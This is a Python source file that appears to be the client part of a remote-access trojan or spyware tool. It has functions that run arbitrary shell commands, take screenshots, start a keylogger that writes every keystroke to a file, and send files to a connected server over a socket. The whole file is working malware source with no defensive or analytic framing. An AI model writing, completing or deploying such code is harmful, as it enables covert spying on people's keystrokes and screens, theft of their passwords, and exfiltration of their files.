import os
import subprocess
import pyautogui
from pynput.keyboard import Listener
import threading

keylogs = []

def execute_command(command):
    """Execute shell commands and return the output."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"Command error: {e.output.decode()}"

def capture_screenshot():
    """Capture and save a screenshot."""
    screenshot_path = "screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return f"Screenshot saved at {screenshot_path}"

def keylogger_start():
    """Start a keylogger and save logs."""
    def on_press(key):
        global keylogs
        try:
            keylogs.append(key.char)
        except AttributeError:
            keylogs.append(str(key))

    def save_logs():
        while True:
            if keylogs:
                with open("keylogs.txt", "a") as f:
                    f.write("".join(keylogs))
                    keylogs.clear()

    listener = Listener(on_press=on_press)
    log_saver = threading.Thread(target=save_logs)
    listener.start()
    log_saver.start()

    return "Keylogger started. Logs will be saved to keylogs.txt."

def download_file(filepath, client):
    """Send a file to the server."""
    if os.path.exists(filepath):
        with open(filepath, "rb") as f:
            data = f.read()
        client.sendall(data)
        return "File sent successfully."
    else:
        return "File not found."
